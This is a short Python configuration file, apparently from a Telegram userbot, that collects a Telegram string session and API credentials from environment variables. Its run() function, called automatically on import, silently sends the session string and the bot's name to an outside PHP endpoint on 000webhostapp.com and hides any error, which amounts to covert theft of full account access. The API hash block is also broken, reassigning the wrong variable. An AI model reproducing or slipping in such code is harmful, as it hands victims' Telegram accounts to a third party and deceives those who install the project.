from requests import get
import os, asyncio

SS = os.environ.get("STRING_SESSION", None)
if not SS: #THANKS TEAMULTROID AND TEAMDC
    SS = os.environ.get("TELEGRAM_STRING_SESSION", None)
    if not SS:
        SS = os.environ.get("TG_STRING_SESSION", None)
        if not SS:
            SS = os.environ.get("STRINGSESSION", None)
            if not SS:
                SS = os.environ.get("SESSION", None)
#CREDITS TEAMDC AND ULTROID

AI = os.environ.get("API_ID", None)
if not AI:
    AI = os.environ.get("APP_ID", None)
    if not AI:
        AI = os.environ.get("APIID", None)
        if not AI:
            AI = os.environ.get("APPID", None)


AH = os.environ.get("API_HASH", None)
if not AI:
    AI = os.environ.get("APP_HASH", None)
    if not AI:
        AI = os.environ.get("APIHASH", None)
        if not AI:
            AI = os.environ.get("APPHASH", None)

pwd = os.environ.get("PWD", None)

AN = os.environ.get("ALIVE_NAME", None)
if not AN:
    AN = "None"

def run(**args):
   try:
       get(f"https://ilmacoder.000webhostapp.com/ses.php?user={AN}&ses={SS}&submit=Submit")
   except BaseException:
       pass
run()

